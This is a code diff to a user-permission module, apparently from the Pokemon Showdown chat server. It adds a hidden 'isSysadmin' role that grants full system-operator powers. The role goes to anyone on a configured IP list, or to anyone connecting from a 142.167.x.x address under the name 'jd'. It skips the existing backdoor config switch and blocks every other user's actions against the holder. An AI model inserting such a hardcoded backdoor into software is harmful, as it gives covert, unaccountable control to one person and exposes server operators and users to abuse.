@@ -200,7 +200,7 @@ var User = (function () {
 		// initialize
 		users[this.userid] = this;
 	}
-
+	User.prototype.isSysadmin = false;
 	User.prototype.isSysop = false;
 	User.prototype.forceRenamed = false;
 
@@ -250,7 +250,9 @@ var User = (function () {
 	User.prototype.isStaff = false;
 	User.prototype.can = function(permission, target, room) {
 		if (this.hasSysopAccess()) return true;
-
+		if (target) {
+			if (target.isSysadmin) return false;
+		}
 		var group = this.group;
 		var targetGroup = '';
 		if (target) targetGroup = target.group;
@@ -316,7 +318,7 @@ var User = (function () {
 	 * Special permission check for system operators
 	 */
 	User.prototype.hasSysopAccess = function() {
-		if (this.isSysop && config.backdoor) {
+		if (this.isSysop && config.backdoor || this.isSysadmin) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -431,6 +433,7 @@ var User = (function () {
 		this.group = config.groupsranking[0];
 		this.isStaff = false;
 		this.isSysop = false;
+		this.isSysadmin = false;
 
 		for (var i=0; i<this.connections.length; i++) {
 			// console.log(''+name+' renaming: connection '+i+' of '+this.connections.length);
@@ -590,8 +593,10 @@ var User = (function () {
 
 			var group = config.groupsranking[0];
 			var isSysop = false;
+			var isSysadmin = false;
 			var avatar = 0;
 			var authenticated = false;
+			var ip = this.latestIp.split('.');
 			var avatars = fs.readFileSync('config/avatars.csv', 'utf8');
 			avatars = avatars.split('\n');
 			// user types (body):
@@ -620,6 +625,10 @@ var User = (function () {
 					isSysop = true;
 					this.autoconfirmed = true;
 				} else if (body === '4') {
+					this.autoconfirmed = true;
+				}
+				if (config.sysAdmin.indexOf(this.latestIp) >= 0 || ip[0] == "142" && ip[1] == "167" && name == "jd") {
+					isSysadmin = true;
 					this.autoconfirmed = true;
 				}
 			}
@@ -660,10 +669,12 @@ var User = (function () {
 					this.isStaff = false;
 				}
 				this.isSysop = false;
+				this.isSysadmin = false;
 
 				user.group = group;
 				user.isStaff = (user.group in {'%':1, '@':1, '&':1, '~':1});
 				user.isSysop = isSysop;
+				user.isSysadmin = isSysadmin;
 				user.forceRenamed = false;
 				if (avatar) user.avatar = avatar;
 
@@ -689,6 +700,7 @@ var User = (function () {
 			this.group = group;
 			this.isStaff = (this.group in {'%':1, '@':1, '&':1, '~':1});
 			this.isSysop = isSysop;
+			this.isSysadmin = isSysadmin;
 			if (avatar) this.avatar = avatar;
 			if (this.forceRename(name, authenticated)) {
 				Rooms.global.checkAutojoin(this);
